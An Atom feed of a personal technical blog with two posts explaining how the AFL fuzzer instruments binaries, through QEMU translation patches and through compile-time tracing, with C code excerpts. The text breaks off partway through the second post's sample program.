<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>bharadwaj.machiraju</title><link href="https://tunnelshade.in/" rel="alternate"></link><link href="https://tunnelshade.in/feeds/all.atom.xml" rel="self"></link><id>https://tunnelshade.in/</id><updated>2018-02-06T00:00:00+05:30</updated><entry><title>Internals of AFL fuzzer - QEMU Instrumentation</title><link href="https://tunnelshade.in/blog/2018/02/afl-internals-qemu-instrumentation/" rel="alternate"></link><published>2018-02-06T00:00:00+05:30</published><updated>2018-02-06T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2018-02-06:/blog/2018/02/afl-internals-qemu-instrumentation/</id><summary type="html">&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;If you need an introduction to &lt;a class="reference external" href="http://lcamtuf.coredump.cx/afl/"&gt;AFL&lt;/a&gt;, you have probably missed out a lot in the instrumented binary fuzzing saga
for the past couple of years. &lt;strong&gt;afl-fuzz&lt;/strong&gt;(fuzzer part of this toolset) is extremely fast, easy to use and requires minimal configuration.
Technical details of AFL are available &lt;a class="reference external" href="http://lcamtuf.coredump.cx/afl/technical_details.txt"&gt;here â€¦&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;If you need an introduction to &lt;a class="reference external" href="http://lcamtuf.coredump.cx/afl/"&gt;AFL&lt;/a&gt;, you have probably missed out a lot in the instrumented binary fuzzing saga
for the past couple of years. &lt;strong&gt;afl-fuzz&lt;/strong&gt;(fuzzer part of this toolset) is extremely fast, easy to use and requires minimal configuration.
Technical details of AFL are available &lt;a class="reference external" href="http://lcamtuf.coredump.cx/afl/technical_details.txt"&gt;here&lt;/a&gt;. All this awesomeness is written in C, a
language that I almost never used. So I wanted to try and understand the implementation i.e How ideas were translated to code in AFL.&lt;/p&gt;
&lt;p&gt;Before proceeding further, it is recommended to read through &lt;a class="reference external" href="https://tunnelshade.in/blog/2018/01/afl-internals-compile-time-instrumentation/"&gt;afl compile time instrumentation&lt;/a&gt;.
Now, what about the black box binaries for which source code is unavailable?? Instrumentation is used to&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Trace the execution flow of basic blocks for the specificied fuzzy input.&lt;/li&gt;
&lt;li&gt;Save time by fuzzing in a &lt;a class="reference external" href="https://lcamtuf.blogspot.in/2014/10/fuzzing-binaries-without-execve.html"&gt;forkserver model&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;One way is to parse the given binary and rewrite it along with the instrumentation (afl-dyninst).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="qemu"&gt;
&lt;h2&gt;1. QEMU&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="https://www.qemu.org/"&gt;QEMU&lt;/a&gt; is also a process emulator that lets you run different architectures on a single machine by doing dynamic translation.&lt;/p&gt;
&lt;div class="section" id="binary-translation"&gt;
&lt;h3&gt;1.1 Binary Translation&lt;/h3&gt;
&lt;p&gt;Read &lt;a class="reference external" href="https://www.slideshare.net/RampantJeff/qemu-binary-translation"&gt;qemu binary translation&lt;/a&gt; (All subsequent qemu internals' images are taken
from this presentation). QEMU can&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Translate basic blocks of one architecture (target i.e arch being emulated) to another (host i.e arch on which qemu is being run).&lt;/li&gt;
&lt;li&gt;Store the translated blocks (&lt;strong&gt;TB&lt;/strong&gt;) in translated block cache (&lt;strong&gt;TBC&lt;/strong&gt;) enabling translate once and use multiple times.&lt;/li&gt;
&lt;li&gt;Add prologue and epilogue to basic blocks to handle operations like jumps between basic blocks, restoring control etc..&lt;/li&gt;
&lt;/ul&gt;
&lt;img alt="QEMU prologue and epilogue" class="align-center" src="https://wiki.xen.org/images/thumb/d/d0/F-t-2.jpg/600px-F-t-2.jpg" /&gt;
&lt;/div&gt;
&lt;div class="section" id="execution-flow"&gt;
&lt;h3&gt;1.2 Execution flow&lt;/h3&gt;
&lt;p&gt;Let us walk through an abstracted qemu execution run&lt;/p&gt;
&lt;img alt="QEMU Execution run" class="align-center" src="https://image.slidesharecdn.com/qemu-binarytranslation-140930222818-phpapp02/95/qemu-binary-translation-10-638.jpg" /&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Start the pre-generated code prologue, i.e initialize the process and jmp to &lt;strong&gt;_start&lt;/strong&gt; of the binary.&lt;/li&gt;
&lt;li&gt;Look for the translated block containing the &lt;strong&gt;_start&lt;/strong&gt; program counter (PC) in the cache. If no, generate translation and cache it.&lt;/li&gt;
&lt;li&gt;Jump to the translated block and execute it.&lt;/li&gt;
&lt;li&gt;On next jump, repeat from the cache search.&lt;/li&gt;
&lt;/ul&gt;
&lt;img alt="QEMU Exection Flow" class="align-center" src="https://image.slidesharecdn.com/qemu-binarytranslation-140930222818-phpapp02/95/qemu-binary-translation-15-638.jpg" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="idea"&gt;
&lt;h2&gt;2. Idea&lt;/h2&gt;
&lt;p&gt;We need to find the function in qemu that gets called for executing a translated block. Keep in mind that
qemu and the binary run in the same process, so this allows us to write instrumentation in C and &lt;a class="reference external" href="https://github.com/mcarpenter/afl/tree/master/qemu_mode/patches"&gt;patch&lt;/a&gt; qemu source.&lt;/p&gt;
&lt;div class="section" id="coverage-instrumentation"&gt;
&lt;h3&gt;2.1 Coverage Instrumentation&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;cur_loc&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cur_loc&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cur_loc&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;cur_loc&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;=&lt;/span&gt; &lt;span class="n"&gt;MAP_SIZE&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="cm"&gt;/* Implement probabilistic instrumentation by looking at scrambled block&lt;/span&gt;
&lt;span class="cm"&gt;address. This keeps the instrumented locations stable across runs. */&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cur_loc&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;afl_inst_rms&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="n"&gt;afl_area_ptr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;cur_loc&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;prev_loc&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;prev_loc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cur_loc&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="communication"&gt;
&lt;h3&gt;2.2. Communication&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Same as compile time instrumentation&lt;/strong&gt;&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;AFL uses forkserver model to fuzz a program. For more info on the forkserver model of fuzzing, check &lt;a class="reference external" href="https://lcamtuf.blogspot.in/2014/10/fuzzing-binaries-without-execve.html"&gt;this&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Instance of the qemu running the target will be used as a forkserver which will communicate with the fuzzer process via fds 198 (control queue) &amp;amp; 199 (status queue).&lt;/li&gt;
&lt;li&gt;Clones of this forkserver instance are used to run the testcases. So, techically the actual fuzzy input execution happens in grandchildren process of the fuzzer.&lt;/li&gt;
&lt;li&gt;The execution trace from the target is available via shared memory (shm) to the fuzzer process.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;QEMU specific tweaks&lt;/strong&gt;&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;An additional fd is used to relay &lt;em&gt;needs translation&lt;/em&gt; messages between child and forkserver. If you recall qemu translation of basic blocks are done on a need basis. When
a new basic block is encoutered in child, the forksever is made aware of the arguments (like pc, code segment base, flags) required for translation of that block. This allows
the forkserver to cache the translation block by performing the translation in it's process. All the subsequent children cloned from the forkserver, will have the new TB in
the cache.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="implementation"&gt;
&lt;h2&gt;3. Implementation&lt;/h2&gt;
&lt;div class="section" id="qemu-patches"&gt;
&lt;h3&gt;3.1 QEMU Patches&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://github.com/qemu/qemu/blob/4124ea4f5bd367ca6412fb2dfe7ac4d80e1504d9/accel/tcg/cpu-exec.c#L140"&gt;cpu_tb_exec()&lt;/a&gt; is responsible for executing a TB and
information such as &lt;em&gt;pc&lt;/em&gt; address is available there. If you recall the compile time instrumentation where we used random constants for tracing, here we can use
&lt;em&gt;pc&lt;/em&gt; address of basic block as the constant.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cm"&gt;/* Execute a TB, and fix up the CPU state afterwards if necessary */&lt;/span&gt;
&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kr"&gt;inline&lt;/span&gt; &lt;span class="n"&gt;tcg_target_ulong&lt;/span&gt; &lt;span class="nf"&gt;cpu_tb_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CPUState&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;cpu&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TranslationBlock&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;CPUArchState&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;env&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cpu&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;env_ptr&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;uintptr_t&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;TranslationBlock&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;last_tb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;tb_exit&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;tb_ptr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;tc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ptr&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="cm"&gt;/* AFL Instrumentation here */&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;pc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;afl_entry_point&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;afl_setup&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;afl_forkserver&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cpu&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;afl_maybe_log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="cm"&gt;/* End AFL Instrumentation here */&lt;/span&gt;

    &lt;span class="n"&gt;qemu_log_mask_and_addr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CPU_LOG_EXEC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                           &lt;span class="s"&gt;&amp;quot;Trace %d: %p [&amp;quot;&lt;/span&gt;
                           &lt;span class="n"&gt;TARGET_FMT_lx&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;TARGET_FMT_lx&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/%#x] %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                           &lt;span class="n"&gt;cpu&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;cpu_index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;tc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                           &lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;cs_base&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                           &lt;span class="n"&gt;lookup_symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;itb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
 &lt;span class="p"&gt;....&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://github.com/qemu/qemu/blob/4124ea4f5bd367ca6412fb2dfe7ac4d80e1504d9/accel/tcg/cpu-exec.c#L379"&gt;tb_find()&lt;/a&gt; is responsible for finding a TB based on
current state. This function takes care of cache lookup and calls &lt;a class="reference external" href="https://github.com/qemu/qemu/blob/4124ea4f5bd367ca6412fb2dfe7ac4d80e1504d9/accel/tcg/cpu-exec.c#L404"&gt;tb_gen_code()&lt;/a&gt;
incase of translation required. We can add &lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h#L257"&gt;afl_request_tsl()&lt;/a&gt; here to signal
&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h#L277"&gt;forkserver to translate&lt;/a&gt; and keep this block in its memory for future clones. The
parameters required for translation are constructed into a struct and passed.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;afl_tsl&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;afl_fork_child&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pc&lt;/span&gt;      &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cs_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flags&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TSL_FD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;afl_tsl&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;afl_tsl&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/master/qemu_mode/patches/elfload.diff"&gt;elfload.patch&lt;/a&gt; to record the &lt;em&gt;afl_entry_poiunt&lt;/em&gt;, &lt;em&gt;afl_start_code&lt;/em&gt; &amp;amp; &lt;em&gt;afl_end_code&lt;/em&gt;. These attributes
are used in &lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h#L227"&gt;afl_maybe_log()&lt;/a&gt; for some bounds check.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/master/qemu_mode/patches/syscall.diff"&gt;syscall.patch&lt;/a&gt; to pass the right &lt;em&gt;pid&lt;/em&gt; and &lt;em&gt;tgid&lt;/em&gt; incase of &lt;em&gt;SIGABRT&lt;/em&gt; on forkserver.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="afl-patches"&gt;
&lt;h3&gt;3.2 AFL Patches&lt;/h3&gt;
&lt;p&gt;These are just plain C ports of the existing assembly.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h#L227"&gt;afl_maybe_log()&lt;/a&gt; is the function that is calls setup for the first time and
updates shared tracing memory for every execution of a TB.&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h#L107"&gt;afl_setup()&lt;/a&gt; setups the shared memory in the child process. This SHM is where
the 64kB trace data array is stored.&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h#L160"&gt;afl_forkserver()&lt;/a&gt; is responsible for creation of forkserver and listen
on fd for launching clones.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;PS&lt;/strong&gt;: Considering what QEMU is capable of, I was amazed by the simplicity of this &lt;a class="reference external" href="https://github.com/mcarpenter/afl/tree/master/qemu_mode/patches"&gt;patch&lt;/a&gt; which required no major modifications to &lt;strong&gt;afl-fuzz&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</content><category term="fuzzing"></category><category term="reversing"></category><category term="afl"></category></entry><entry><title>Internals of AFL fuzzer - Compile Time Instrumentation</title><link href="https://tunnelshade.in/blog/2018/01/afl-internals-compile-time-instrumentation/" rel="alternate"></link><published>2018-01-31T00:00:00+05:30</published><updated>2018-01-31T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2018-01-31:/blog/2018/01/afl-internals-compile-time-instrumentation/</id><summary type="html">&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;If you need an introduction to &lt;a class="reference external" href="http://lcamtuf.coredump.cx/afl/"&gt;AFL&lt;/a&gt;, you have probably missed out a lot in the instrumented binary fuzzing saga
for the past couple of years. &lt;strong&gt;afl-fuzz&lt;/strong&gt;(fuzzer part of this toolset) is extremely fast, easy to use and requires minimal configuration.
Technical details of AFL are available &lt;a class="reference external" href="http://lcamtuf.coredump.cx/afl/technical_details.txt"&gt;here â€¦&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;If you need an introduction to &lt;a class="reference external" href="http://lcamtuf.coredump.cx/afl/"&gt;AFL&lt;/a&gt;, you have probably missed out a lot in the instrumented binary fuzzing saga
for the past couple of years. &lt;strong&gt;afl-fuzz&lt;/strong&gt;(fuzzer part of this toolset) is extremely fast, easy to use and requires minimal configuration.
Technical details of AFL are available &lt;a class="reference external" href="http://lcamtuf.coredump.cx/afl/technical_details.txt"&gt;here&lt;/a&gt;. All this awesomeness was written in C, a
language that I almost never used. So I wanted to try and understand the implementation i.e How ideas were translated to code in AFL.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="instrumentation"&gt;
&lt;h2&gt;Instrumentation&lt;/h2&gt;
&lt;div class="section" id="idea"&gt;
&lt;h3&gt;1. Idea&lt;/h3&gt;
&lt;p&gt;Consider a sample program which determines a command line parameter to be even or odd.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;time.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;arc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Odd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Even&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Coverage guided fuzzing requires the fuzzer to be aware of execution flow in the target in response to a certain input. One way to achieve it is to
modify the source code in a way to trace the flow. Somewhat like&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;time.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;arc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;notifyFuzzer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;main starting&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
